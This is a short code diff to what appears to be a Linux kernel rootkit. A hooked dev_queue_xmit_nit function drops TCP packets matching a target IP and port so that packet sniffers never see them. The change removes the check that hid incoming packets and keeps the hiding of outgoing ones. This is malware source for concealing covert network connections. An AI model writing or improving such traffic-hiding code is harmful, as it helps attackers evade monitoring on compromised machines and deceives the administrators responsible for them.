@@ -70,14 +70,11 @@ static asmlinkage void dev_queue_xmit_nit_hook(struct sk_buff *skb,
     if (iph->protocol == IPPROTO_TCP) {
       struct tcphdr *tcph = tcp_hdr(skb);
       u16 dest_port = ntohs(tcph->dest);
-	  u16 src_port = ntohs(tcph->source);
 
       // Compare the destination port and IP address directly
       if (dest_port == dPort && iph->daddr == target_ip) {
         return; // Hide outgoing packet
       }
-	  if (src_port == dPort && iph->saddr == target_ip)
-		  return; // Hide ingoing packet
     }
   }
 
